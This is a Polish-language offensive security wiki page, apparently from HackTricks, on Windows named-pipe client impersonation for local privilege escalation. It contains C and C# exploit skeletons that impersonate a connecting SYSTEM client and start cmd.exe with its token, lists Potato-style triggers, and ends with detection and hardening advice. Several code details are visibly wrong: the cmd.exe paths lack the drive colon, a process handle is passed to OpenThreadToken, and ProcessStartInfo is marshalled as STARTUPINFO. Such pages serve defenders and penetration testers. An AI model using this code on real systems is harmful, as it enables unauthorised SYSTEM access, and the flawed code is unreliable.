# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation to prymityw lokalnego eskalowania uprawnień, który pozwala wątkowi serwera named-pipe przyjąć kontekst zabezpieczeń klienta, który się z nim łączy. W praktyce atakujący, który może uruchamiać kod z uprawnieniami SeImpersonatePrivilege, może wymusić, aby uprzywilejowany klient (np. usługa SYSTEM) połączył się z pipe kontrolowaną przez atakującego, wywołać ImpersonateNamedPipeClient, zdublować powstały token do tokena głównego i uruchomić proces jako ten klient (często NT AUTHORITY\SYSTEM).

Ta strona koncentruje się na podstawowej technice. Dla end-to-end łańcuchów exploitów, które wymuszają, aby SYSTEM połączył się z twoją pipe, zobacz strony z rodziny Potato wymienione poniżej.

## TL;DR
- Utwórz named pipe: \\.\pipe\<random> i oczekuj na połączenie.
- Spowoduj, aby uprzywilejowany komponent połączył się z nim (spooler/DCOM/EFSRPC/etc.).
- Odczytaj przynajmniej jedną wiadomość z pipe, następnie wywołaj ImpersonateNamedPipeClient.
- Otwórz token impersonacji w bieżącym wątku, DuplicateTokenEx(TokenPrimary) i użyj CreateProcessWithTokenW/CreateProcessAsUser, aby uruchomić proces jako SYSTEM.

## Wymagania i kluczowe API
- Uprawnienia zazwyczaj potrzebne procesowi/wątkowi wywołującemu:
- SeImpersonatePrivilege — do skutecznego podszycia się pod klienta łączącego się oraz do użycia CreateProcessWithTokenW.
- Alternatywnie, po podszyciu się pod SYSTEM możesz użyć CreateProcessAsUser, co może wymagać SeAssignPrimaryTokenPrivilege i SeIncreaseQuotaPrivilege (te uprawnienia są spełnione, gdy podszywasz się pod SYSTEM).
- Podstawowe API używane:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (należy odczytać co najmniej jedną wiadomość przed podszyciem)
- ImpersonateNamedPipeClient i RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW lub CreateProcessAsUser
- Poziom podszycia: aby wykonywać użyteczne akcje lokalnie, klient musi zezwolić na SecurityImpersonation (domyślnie dla wielu lokalnych klientów RPC/named-pipe). Klienci mogą obniżyć to ustawienie, używając SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION przy otwieraniu pipe.

## Minimalny przepływ pracy Win32 (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- Jeśli ImpersonateNamedPipeClient zwraca ERROR_CANNOT_IMPERSONATE (1368), upewnij się, że najpierw odczytujesz z pipe'a i że klient nie ograniczył impersonacji do Identification level.
- Preferuj DuplicateTokenEx z SecurityImpersonation i TokenPrimary, aby utworzyć token główny odpowiedni do tworzenia procesu.

## .NET quick example
W .NET, NamedPipeServerStream może dokonać impersonacji za pomocą RunAsClient. Po impersonacji zduplikuj token wątku i utwórz proces.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Typowe wyzwalacze/przymuszenia, by uzyskać podłączenie SYSTEM do twojej pipe
Te techniki zmuszają uprzywilejowane usługi do połączenia się z twoją named pipe, abyś mógł je impersonate:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## Rozwiązywanie problemów i uwagi praktyczne
- Musisz odczytać co najmniej jedną wiadomość z pipe przed wywołaniem ImpersonateNamedPipeClient; w przeciwnym razie otrzymasz ERROR_CANNOT_IMPERSONATE (1368).
- Jeśli klient łączy się z SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, serwer nie może w pełni impersonate; sprawdź poziom impersonacji tokena przez GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW wymaga SeImpersonatePrivilege u wywołującego. Jeśli to zakończy się ERROR_PRIVILEGE_NOT_HELD (1314), użyj CreateProcessAsUser po tym, jak już zaimpersonowałeś SYSTEM.
- Upewnij się, że security descriptor twojej pipe pozwala docelowemu serwisowi na połączenie, jeśli ją zaostrzyłeś; domyślnie pipe pod \\.\pipe są dostępne zgodnie z DACL serwera.

## Wykrywanie i zabezpieczanie
- Monitoruj tworzenie i połączenia named pipe. Sysmon Event IDs 17 (Pipe Created) i 18 (Pipe Connected) są przydatne do wyznaczenia bazy legalnych nazw pipe i wykrywania nietypowych, losowo wyglądających pipe poprzedzających zdarzenia manipulacji tokenami.
- Szukaj sekwencji: proces tworzy pipe, usługa SYSTEM się łączy, a następnie proces tworzący uruchamia proces potomny jako SYSTEM.
- Zmniejsz ekspozycję, usuwając SeImpersonatePrivilege z nieistotnych kont usług i unikając niepotrzebnych logowań usług z wysokimi uprawnieniami.
- Defensive development: przy łączeniu się z nieufnymi named pipes określ SECURITY_SQOS_PRESENT z SECURITY_IDENTIFICATION, aby zapobiec pełnej impersonacji klienta przez serwer, chyba że jest to konieczne.

## References
- Windows: ImpersonateNamedPipeClient documentation (wymagania i zachowanie dotyczące impersonacji). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (przewodnik i przykłady kodu). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
